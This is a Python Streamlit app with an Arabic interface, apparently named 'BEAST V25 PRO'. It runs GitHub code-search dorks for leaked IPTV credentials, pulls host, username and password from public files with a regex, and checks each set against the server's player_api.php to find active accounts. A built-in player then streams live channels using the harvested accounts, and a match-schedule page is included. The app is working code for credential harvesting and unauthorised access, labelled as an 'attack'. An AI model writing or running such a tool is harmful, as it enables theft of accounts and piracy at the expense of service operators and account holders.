import streamlit as st
import requests
import re
import time
import threading
from datetime import datetime

# --- إعدادات الصفحة ---
st.set_page_config(page_title="BEAST V25 PRO", layout="wide")

# --- نظام إدارة الحالة (Global State) ---
# نستخدم cache_resource لضمان بقاء النتائج حتى لو حدث تحديث للصفحة
@st.cache_resource
def get_global_data():
    return {"hits": [], "is_scanning": False}

global_data = get_global_data()

if "auth" not in st.session_state: st.session_state.auth = False
if "page" not in st.session_state: st.session_state.page = "scanner"
if "active_server" not in st.session_state: st.session_state.active_server = None

# --- نظام الدخول ---
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V25 - ULTIMATE</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# --- التنسيقات (CSS) ---
st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .nav-box { display: flex; gap: 10px; margin-bottom: 20px; }
    .hit-card { 
        background: #111; border: 1px solid #00ff41; padding: 10px; 
        border-radius: 5px; margin-bottom: 10px; 
    }
    .match-table { width: 100%; border-collapse: collapse; background: #111; }
    .match-table th, .match-table td { border: 1px solid #333; padding: 12px; text-align: center; }
    .match-table th { background: #00ff41; color: black; }
</style>
""", unsafe_allow_html=True)

# --- وظيفة البحث في الخلفية (Thread) ---
def background_scanner(token, pages):
    global_data["is_scanning"] = True
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        '"http://" "username=" "password=" "port" extension:txt'
    ]
    
    for dork in dorks:
        for p in range(1, pages + 1):
            try:
                url = f"https://api.github.com/search/code?q={dork}&page={p}&per_page=50"
                res = requests.get(url, headers=headers).json()
                if "items" not in res: 
                    time.sleep(10); continue
                
                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    content = requests.get(raw_url, timeout=3).text
                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                    
                    for m in matches:
                        host, user, pw = m[0], m[1], m[2]
                        try:
                            # فحص سريع للسيرفر
                            check = requests.get(f"{host}/player_api.php?username={user}&password={pw}", timeout=2).json()
                            if check.get("user_info", {}).get("status") == "Active":
                                hit = {"host": host, "user": user, "pw": pw, "time": datetime.now().strftime("%H:%M:%S")}
                                if hit not in global_data["hits"]:
                                    global_data["hits"].insert(0, hit) # إضافة النتيجة في الأعلى
                        except: continue
            except: continue
    global_data["is_scanning"] = False

# --- الهيدر (Navigation) ---
st.markdown("## ⚡ BEAST V25 PANEL")
col_n1, col_n2, col_n3, col_n4 = st.columns(4)
with col_n1:
    if st.button("📡 البحث المباشر", use_container_width=True): st.session_state.page = "scanner"
with col_n2:
    if st.button("📅 جدول المباريات", use_container_width=True): st.session_state.page = "matches"
with col_n3:
    if st.button("📺 المشغل الذكي", use_container_width=True): st.session_state.page = "player"
with col_n4:
    if st.button("🔄 تحديث النتائج", use_container_width=True): st.rerun()

st.divider()

# --- صفحة البحث ---
if st.session_state.page == "scanner":
    col_set, col_res = st.columns([1, 2])
    
    with col_set:
        st.subheader("⚙️ التحكم بالهجوم")
        token = st.text_input("GitHub Token:", type="password")
        pgs = st.number_input("عدد الصفحات", 1, 100, 20)
        if st.button("🚀 ابدأ البحث في الخلفية"):
            if not global_data["is_scanning"]:
                thread = threading.Thread(target=background_scanner, args=(token, pgs))
                thread.start()
                st.success("بدأ البحث في الخلفية بنجاح!")
            else: st.warning("البحث جارٍ بالفعل...")
        
        if global_data["is_scanning"]: st.info("⏳ جاري جلب سيرفرات جديدة حالياً...")
        else: st.success("✅ البحث متوقف حالياً")

    with col_res:
        st.subheader(f"🏆 النتائج المكتشفة ({len(global_data['hits'])})")
        for idx, h in enumerate(global_data["hits"]):
            with st.container():
                st.markdown(f"""
                <div class="hit-card">
                    <b>{h['time']}</b> | <span style="color:#00ff41">{h['host']}</span><br>
                    <small>User: {h['user']} | Pass: {h['pw']}</small>
                </div>
                """, unsafe_allow_html=True)
                if st.button(f"فتح السيرفر {h['user']}", key=f"srv_{idx}"):
                    st.session_state.active_server = h
                    st.session_state.page = "player"
                    st.rerun()

# --- صفحة جدول المباريات ---
elif st.session_state.page == "matches":
    st.subheader("📅 مباريات اليوم")
    # مثال لبيانات مباريات (يمكن ربطها بـ API لاحقاً)
    matches_data = [
        {"time": "22:00", "home": "Real Madrid", "away": "Man City", "league": "Champions League"},
        {"time": "22:00", "home": "Arsenal", "away": "Bayern", "league": "Champions League"},
        {"time": "20:00", "home": "Al Ahly", "away": "Zamalek", "league": "Egyptian League"},
    ]
    
    html_table = "<table class='match-table'><tr><th>الوقت</th><th>الفريق الأول</th><th>الفريق الثاني</th><th>البطولة</th></tr>"
    for m in matches_data:
        html_table += f"<tr><td>{m['time']}</td><td>{m['home']}</td><td>{m['away']}</td><td>{m['league']}</td></tr>"
    html_table += "</table>"
    st.markdown(html_table, unsafe_allow_html=True)
    st.info("ملاحظة: يمكنك العودة لصفحة البحث دون أن يتوقف البحث في الخلفية.")

# --- صفحة المشغل ---
elif st.session_state.page == "player":
    if not st.session_state.active_server:
        st.warning("الرجاء اختيار سيرفر من صفحة البحث أولاً.")
    else:
        srv = st.session_state.active_server
        st.subheader(f"📺 مشغل: {srv['host']}")
        
        # جلب القنوات
        try:
            r = requests.get(f"{srv['host']}/player_api.php?username={srv['user']}&password={srv['pw']}&action=get_live_streams", timeout=5).json()
            
            col_list, col_vid = st.columns([1, 2])
            with col_list:
                search_ch = st.text_input("🔍 ابحث عن قناة...")
                for ch in r[:200]: # عرض أول 200 قناة للسرعة
                    if search_ch.lower() in ch['name'].lower():
                        if st.button(ch['name'], key=f"ch_{ch['stream_id']}", use_container_width=True):
                            st.session_state.current_url = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.m3u8"
            
            with col_vid:
                if "current_url" in st.session_state:
                    st.components.v1.html(f"""
                        <link href="https://vjs.zencdn.net/7.20.3/video-js.css" rel="stylesheet" />
                        <video id="my-video" class="video-js vjs-big-play-centered" controls preload="auto" width="100%" height="450" data-setup='{{"fluid": true}}'>
                            <source src="{st.session_state.current_url}" type="application/x-mpegURL">
                        </video>
                        <script src="https://vjs.zencdn.net/7.20.3/video.min.js"></script>
                    """, height=500)
                else:
                    st.info("اختر قناة من القائمة للتشغيل")
        except:
            st.error("السيرفر لا يستجيب حالياً.")
